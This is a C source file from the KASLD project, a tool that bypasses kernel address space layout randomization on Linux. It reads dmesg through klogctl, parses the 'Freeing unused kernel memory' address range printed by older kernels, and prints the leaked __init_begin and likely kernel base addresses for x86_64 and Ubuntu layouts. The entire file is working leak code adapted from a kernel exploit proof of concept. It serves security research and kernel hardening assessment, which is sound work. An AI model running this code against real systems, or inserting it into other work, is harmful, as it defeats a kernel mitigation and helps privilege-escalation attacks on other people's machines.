// This file is part of KASLD - https://github.com/bcoles/kasld
//
// free_reserved_area() dmesg KASLR bypass for SMP kernels.
//
// x86:
// [    0.985903] Freeing unused kernel memory: 872K (c19b4000 - c1a8e000)
// x86_64:
// [    0.872873] Freeing unused kernel memory: 1476K (ffffffff81f41000 - ffffffff820b2000)
//
// free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
//
// Mostly taken from original code by xairy:
// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
// ---
// <bcoles@gmail.com>

#define _DEFAULT_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <unistd.h>
#include "kasld.h"

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char **buffer, int *size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char *)mmap(NULL, *size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long get_kernel_addr_free_reserved_area_dmesg() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  char *addr_buf;
  const char *needle = "Freeing unused kernel memory";
  int size;
  unsigned long addr = 0;

  printf("[.] checking dmesg for free_reserved_area() info ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  addr_buf = strstr(line_buf, "(");
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[1], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_free_reserved_area_dmesg();
  if (!addr)
    return 1;

  printf("leaked __init_begin: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & ~KERNEL_BASE_MASK);

#if defined(__x86_64__) || defined(__amd64__)
  printf("kernel base (ubuntu trusty): %lx\n", addr & 0xffffffffff000000ul);
  printf("kernel base (ubuntu xenial): %lx\n",
         (addr & 0xfffffffffff00000ul) - 0x1000000ul);
#endif

  return 0;
}
